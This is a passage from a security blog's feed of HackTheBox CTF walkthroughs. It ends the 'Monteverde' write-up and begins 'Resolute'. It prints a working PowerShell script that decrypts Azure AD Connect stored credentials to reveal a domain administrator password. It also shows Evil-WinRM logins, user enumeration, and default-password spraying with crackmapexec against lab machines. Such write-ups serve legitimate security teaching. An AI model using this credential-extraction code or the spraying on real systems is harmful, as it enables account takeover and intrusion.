N=<span class="string">&quot;Password&quot;</span>&gt;4n0therD4y@n0th3r$&lt;/S&gt;</span><br><span class="line">    &lt;/Props&gt;</span><br><span class="line">  &lt;/Obj&gt;</span><br><span class="line">&lt;/Objs&gt;% </span><br></pre></td></tr></table></figure><p>We got lucky there is a password in it. Is that <code>mhope</code> account password ? </p><p>SSH is not open but WinRM port <code>5985</code> is, so we should be able to get a shell from there. As a reminder:</p><blockquote><p>WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal">https://docs.microsoft.com/en-us/windows/win32/winrm/portal</a></p></blockquote><h3 id="Evil-WinRM-shell-as-mhope"><a href="#Evil-WinRM-shell-as-mhope" class="headerlink" title="Evil-WinRM shell as mhope"></a>Evil-WinRM shell as mhope</h3><p>To get a WinRM shell I am going to use <a href="https://github.com/Hackplayers/evil-winrm"><code>Evil-WinRM</code></a> tools which provide numerous super useful <a href="https://github.com/Hackplayers/evil-winrm#features">features</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ evil-winrm -i 10.10.10.172 -u mhope -p <span class="string">&quot;4n0therD4y@n0th3r$&quot;</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2.3</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; <span class="built_in">type</span> ../Desktop/user.txt</span><br><span class="line">4xxxxxxxxxxxxxxx2</span><br></pre></td></tr></table></figure><h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s try to get more information about our current user <code>mhope</code>:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\mhope\Documents&gt; whoami /all</span><br><span class="line"></span><br><span class="line">[<span class="type">USER</span> <span class="type">INFORMATION</span></span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line"><span class="type">User</span> <span class="type">Name</span>      <span class="type">SID</span></span><br><span class="line">============== ============================================</span><br><span class="line"><span class="type">megabank</span>\<span class="type">mhope</span> <span class="type">S</span>-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">391775091</span>-<span class="number">850290835</span>-<span class="number">3566037492</span>-<span class="number">1601</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">GROUP</span> INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line"><span class="built_in">Group</span> Name                                  <span class="built_in">Type</span>             SID                                          </span><br><span class="line">=========================================== ================ ============================================ </span><br><span class="line">[<span class="type">...</span>]</span><br><span class="line">MEGABANK\Azure Admins                       <span class="built_in">Group</span>            S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-391775091</span><span class="literal">-850290835</span><span class="literal">-3566037492</span><span class="literal">-2601</span> </span><br><span class="line"></span><br><span class="line">[<span class="type">...</span>]</span><br></pre></td></tr></table></figure><p>One of the most noteworthy information is that <code>mhope</code> belongs to <code>Azure Admins</code> group. Which makes sense after finding the <code>azure.xml</code> config file earlier.</p><p>Let’s dig a bit more to see if we can find more informations related to <code>Azure</code>.</p><p>While looking around at running services we stumble upon a service named <code>Azure AD Connect Health Sync</code>:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\mhope\Documents&gt; services</span><br><span class="line"></span><br><span class="line">Path                                                                                                                            Privileges Service</span><br><span class="line">----                                                                                                                            ---------- -------</span><br><span class="line">[<span class="type">...</span>]</span><br><span class="line"><span class="string">&quot;C:\Program Files\Microsoft Azure AD Connect Health Sync Agent\Insights\Microsoft.Identity.AadConnect.Health.AadSync.Host.exe&quot;</span>       False AzureADConnectHealthSyncInsights</span><br></pre></td></tr></table></figure><p>The <a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect">Microsoft documentation</a> explains what this service is used for:</p><blockquote><p>Azure AD Connect is the Microsoft tool designed to meet and accomplish your hybrid identity goals. It provides the following features:</p><ul><li>Password hash synchronization - A sign-in method that synchronizes a hash of a users on-premises AD password with Azure AD.</li><li>Pass-through authentication - A sign-in method that allows users to use the same password on-premises and in the cloud, but doesn’t require the additional infrastructure of a federated environment.</li><li>Federation integration - Federation is an optional part of Azure AD Connect and can be used to configure a hybrid environment using an on-premises AD FS infrastructure. It also provides AD FS management capabilities such as certificate renewal and additional AD FS server deployments.</li><li>Synchronization - Responsible for creating users, groups, and other objects. As well as, making sure identity information for your on-premises users and groups is matching the cloud. This synchronization also includes password hashes.</li><li>Health Monitoring - Azure AD Connect Health can provide robust monitoring and provide a central location in the Azure portal to view this activity.</li></ul></blockquote><p>The <code>Password hash synchronization</code> and <code>Pass-through authentication</code> might be interesting to escalate our privileges. It may me worth digging a bit this service.</p><p>While searching for more informations we stumbled upon a quite interesting article : “<a href="https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">Azure AD Connect Database Privilege Escalation Exploit</a>“:</p><blockquote><p>Its possible to just run some simple .NET or Powershell code on the server where Azure AD Connect is installed and instantly get plain text credentials for whatever AD account it is set to use!</p></blockquote><p>We can also find a few other <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">articles explaining in details this vulnerability</a>.</p><p>Basically when deploying a new <code>ADSync</code> connector, the credentials gets stored in a local SQL Database. Then, when credentials need to be retrieved, they get decrypted using <code>mcrypt.dll</code> library located in <code>C:\Program Files\Microsoft Azure AD Sync\Bin\</code>. </p><p>Indeed while looking at open connection on the box we can see port <code>1434</code> (Microsoft SQL Server) listening on localhost: </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\&gt; netstat <span class="literal">-an</span> | <span class="built_in">select-string</span> <span class="literal">-pattern</span> <span class="string">&quot;listening&quot;</span></span><br><span class="line">[<span class="type">...</span>]</span><br><span class="line">TCP    <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">1434</span>         <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">0</span>              LISTENING</span><br></pre></td></tr></table></figure><h3 id="Azure-AD-Sync-privilege-escalation"><a href="#Azure-AD-Sync-privilege-escalation" class="headerlink" title="Azure AD Sync privilege escalation"></a>Azure AD Sync privilege escalation</h3><p>We should now have all the piece needed to decrypt the credentials stored in SQL Database. </p><p>Let’s use this <a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1">Powershell Proof-of-Concept</a> to do so:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">Azure-ADConnect</span></span> &#123;<span class="keyword">param</span>(<span class="variable">$db</span>,<span class="variable">$server</span>)</span><br><span class="line"><span class="variable">$help</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">.SYNOPSIS</span></span><br><span class="line"><span class="string">    Azure-ADConnect</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$db</span> <span class="operator">-eq</span> <span class="variable">$null</span> <span class="operator">-or</span> <span class="variable">$server</span> <span class="operator">-eq</span> <span class="variable">$null</span>) &#123;<span class="variable">$help</span>&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$client</span> = <span class="built_in">new-object</span> System.Data.SqlClient.SqlConnection <span class="literal">-ArgumentList</span> <span class="string">&quot;Server = <span class="variable">$server</span>; Database = <span class="variable">$db</span>; Initial Catalog=<span class="variable">$db</span>; </span></span><br><span class="line"><span class="string">Integrated Security = True;&quot;</span></span><br><span class="line"><span class="variable">$client</span>.Open()</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$client</span>.CreateCommand()</span><br><span class="line"><span class="variable">$cmd</span>.CommandText = <span class="string">&quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&quot;</span></span><br><span class="line"><span class="variable">$reader</span> = <span class="variable">$cmd</span>.ExecuteReader()</span><br><span class="line"><span class="variable">$reader</span>.Read() | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="variable">$key_id</span> = <span class="variable">$reader</span>.GetInt32(<span class="number">0</span>)</span><br><span class="line"><span class="variable">$instance_id</span> = <span class="variable">$reader</span>.GetGuid(<span class="number">1</span>)</span><br><span class="line"><span class="variable">$entropy</span> = <span class="variable">$reader</span>.GetGuid(<span class="number">2</span>)</span><br><span class="line"><span class="variable">$reader</span>.Close()</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$client</span>.CreateCommand()</span><br><span class="line"><span class="variable">$cmd</span>.CommandText = <span class="string">&quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#x27;AD&#x27;&quot;</span></span><br><span class="line"><span class="variable">$reader</span> = <span class="variable">$cmd</span>.ExecuteReader()</span><br><span class="line"><span class="variable">$reader</span>.Read() | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="variable">$config</span> = <span class="variable">$reader</span>.GetString(<span class="number">0</span>)</span><br><span class="line"><span class="variable">$crypted</span> = <span class="variable">$reader</span>.GetString(<span class="number">1</span>)</span><br><span class="line"><span class="variable">$reader</span>.Close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">add-type</span> <span class="literal">-path</span> <span class="string">&quot;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&quot;</span></span><br><span class="line"><span class="variable">$km</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager</span><br><span class="line"><span class="variable">$km</span>.LoadKeySet(<span class="variable">$entropy</span>, <span class="variable">$instance_id</span>, <span class="variable">$key_id</span>)</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$null</span></span><br><span class="line"><span class="variable">$km</span>.GetActiveCredentialKey([<span class="type">ref</span>]<span class="variable">$key</span>)</span><br><span class="line"><span class="variable">$key2</span> = <span class="variable">$null</span></span><br><span class="line"><span class="variable">$km</span>.GetKey(<span class="number">1</span>, [<span class="type">ref</span>]<span class="variable">$key2</span>)</span><br><span class="line"><span class="variable">$decrypted</span> = <span class="variable">$null</span></span><br><span class="line"><span class="variable">$key2</span>.DecryptBase64ToString(<span class="variable">$crypted</span>, [<span class="type">ref</span>]<span class="variable">$decrypted</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$domain</span> = <span class="built_in">select-xml</span> <span class="literal">-Content</span> <span class="variable">$config</span> <span class="literal">-XPath</span> <span class="string">&quot;//parameter[@name=&#x27;forest-login-domain&#x27;]&quot;</span> | <span class="built_in">select</span> <span class="selector-tag">@</span>&#123;Name = <span class="string">&#x27;Domain&#x27;</span>; Expression = &#123;<span class="variable">$_</span>.node.InnerXML&#125;&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">select-xml</span> <span class="literal">-Content</span> <span class="variable">$config</span> <span class="literal">-XPath</span> <span class="string">&quot;//parameter[@name=&#x27;forest-login-user&#x27;]&quot;</span> | <span class="built_in">select</span> <span class="selector-tag">@</span>&#123;Name = <span class="string">&#x27;Username&#x27;</span>; Expression = &#123;<span class="variable">$_</span>.node.InnerXML&#125;&#125;</span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">select-xml</span> <span class="literal">-Content</span> <span class="variable">$decrypted</span> <span class="literal">-XPath</span> <span class="string">&quot;//attribute&quot;</span> | <span class="built_in">select</span> <span class="selector-tag">@</span>&#123;Name = <span class="string">&#x27;Password&#x27;</span>; Expression = &#123;<span class="variable">$_</span>.node.InnerXML&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;[+] Domain:  &quot;</span> + <span class="variable">$domain</span>.Domain</span><br><span class="line"><span class="string">&quot;[+] Username: &quot;</span> + <span class="variable">$username</span>.Username</span><br><span class="line"><span class="string">&quot;[+]Password: &quot;</span> + <span class="variable">$password</span>.Password</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>Let’s upload and run the script:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Temp&gt; upload Azure<span class="literal">-ADConnect</span>.ps1</span><br><span class="line">Info: Uploading Azure<span class="literal">-ADConnect</span>.ps1 to C:\Temp\Azure<span class="literal">-ADConnect</span>.ps1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">Data</span>: <span class="number">3016</span> bytes of <span class="number">3016</span> bytes copied</span><br><span class="line"></span><br><span class="line">Info: Upload successful!</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Temp&gt; <span class="built_in">import-module</span> ./Azure<span class="literal">-ADConnect</span>.ps1</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Temp&gt; Azure<span class="literal">-ADConnect</span> <span class="literal">-server</span> <span class="number">127.0</span>.<span class="number">0.1</span> <span class="literal">-db</span> ADSync</span><br><span class="line">[+] Domain:  MEGABANK.LOCAL</span><br><span class="line">[+] Username: administrator</span><br><span class="line">[+]Password: d0m@in4dminyeah!</span><br></pre></td></tr></table></figure><p>Bingo! We got the clear text password of <code>administrator</code> account. Let’s connect to his account and grab the flag:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">hg8</span>@<span class="type">archbook</span> ~]<span class="variable">$</span> evil<span class="literal">-winrm</span> <span class="literal">-i</span> <span class="number">10.10</span>.<span class="number">10.172</span> <span class="literal">-u</span> administrator <span class="literal">-p</span> <span class="string">&quot;d0m@in4dminyeah\!&quot;</span></span><br><span class="line"></span><br><span class="line">Evil<span class="literal">-WinRM</span> shell v2.<span class="number">3</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\Administrator\Documents&gt; <span class="built_in">type</span> ..\Desktop\root.txt</span><br><span class="line"><span class="number">1</span>xxxxxxxxxxxxxxxxxxc</span><br></pre></td></tr></table></figure><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> Monteverde </tag>
            
            <tag> SMB </tag>
            
            <tag> RPC </tag>
            
            <tag> crackmapexec </tag>
            
            <tag> winRM </tag>
            
            <tag> active directory </tag>
            
            <tag> ADClient </tag>
            
            <tag> evil-winrm </tag>
            
            <tag> Azure </tag>
            
            <tag> Azure AD Connect </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Resolute</title>
      <link href="/posts/resolute/"/>
      <url>/posts/resolute/</url>
      
        <content type="html"><![CDATA[<img width="583" alt="Screenshot 2020-05-28 at 13 49 49" src="https://user-images.githubusercontent.com/9076747/83137834-1b5b9680-a0ea-11ea-9d75-c5ad50234910.png"><p>Resolute just retired on Hackthebox, it’s a medium difficulty Windows box. Still being a bit new to the Windows environment the enumeration process got a bit long and tedious for me at some point but in the end I managed to see real life scenarios and access to <code>root</code>, or should I say <code>SYSTEM</code>. I would recommend this box if you are confortable on easy boxes and want to level up to a medium one.</p><p><strong>Tl;Dr:</strong> To get the user flag you first had to enumerate users using RPC, doing so you find a default password in one user description field. This password allows you to connect to <code>Melanie</code> user through WinRM and get the user flag.<br>For the root flag you first have to pivot to <code>Ryan</code> user using his credentials hard-coded in a Powershell script transcript. <code>Ryan</code> being a DNS Admin we can exploit a DLL Injection attack into the DNS service running as SYSTEM to execute a privileged reverse shell and grab the root flag.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.169 resolute.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC --top-ports 10000 resolute.htb                                                     </span><br><span class="line">Nmap scan report <span class="keyword">for</span> resolute.htb (10.10.10.169)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">53/tcp    open  tcpwrapped</span><br><span class="line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-28 13:32:03Z)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf       .NET Message Framing</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: Resolute</span><br><span class="line">|   NetBIOS computer name: RESOLUTE\x00</span><br><span class="line">|   Domain name: megabank.local</span><br><span class="line">|_  Forest name: megabank.local</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 150.18 seconds</span><br></pre></td></tr></table></figure><p>So the box is running <code>Windows Server 2016 Standard 14393</code> and have several common port open that will probably come useful later like <code>rpc</code>, <code>ldap</code> or <code>winrm</code>. Yet we don’t have FTP, HTTP nor SSH port open so let’s continue our enumeration to grab more information about this box.</p><p>Since port <code>135</code> RPC is open we should be able to enumerate users, let’s run <code>enum4linux</code> to see what we can get:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ enum4linux 10.10.10.169 2&gt;/dev/null</span><br><span class="line">Starting enum4linux v0.8.9 </span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"> =============================</span><br><span class="line">|    Users on 10.10.10.169    |</span><br><span class="line"> =============================</span><br><span class="line">index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account <span class="keyword">for</span> administering the computer/domain</span><br><span class="line">index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.</span><br><span class="line">index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account <span class="keyword">for</span> guest access to the computer/domain</span><br><span class="line">index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)</span><br><span class="line">index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account</span><br><span class="line">index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password <span class="built_in">set</span> to Welcome123!</span><br><span class="line">index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)</span><br><span class="line">index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">enum4linux complete</span><br></pre></td></tr></table></figure><p>We notice something very interesting on <code>marko</code> user:</p><blockquote><p>Desc: Account created. Password set to Welcome123!</p></blockquote><p>Looks like new accounts get a default password set to <code>Welcome123!</code>. </p><p>Since we have port WinRM port 5985 open maybe we can list <code>marko</code> files:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ smbclient -U <span class="string">&#x27;marko&#x27;</span> //10.10.10.169/c$</span><br><span class="line">Enter MYGROUP\marko<span class="string">&#x27;s password: Welcome123!</span></span><br><span class="line"><span class="string">session setup failed: NT_STATUS_LOGON_FAILURE</span></span><br></pre></td></tr></table></figure><p>No luck here. Seems like <code>marko</code> either already change his password… </p><h3 id="Brute-force-using-default-password"><a href="#Brute-force-using-default-password" class="headerlink" title="Brute-force using default password"></a>Brute-force using default password</h3><p>Since <code>Welcome123!</code> seems to be the default password for newly created accounts maybe other users still uses this password ?</p><p>With the list of users we retrieve earlier let’s run <code>crackmapexec</code> to see if any account can login with <code>Welcome123!</code> :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ crackmapexec smb 10.10.10.169 -u users.txt -p password.txt</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [*] Windows Server 2016 Standard 14393 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  RESOLUTE  [-] megabank.local\krbtgt:Welcome123! STATUS_LOGON_FAILURE</span><br><span class="line">SMB  10.10.10.169  445  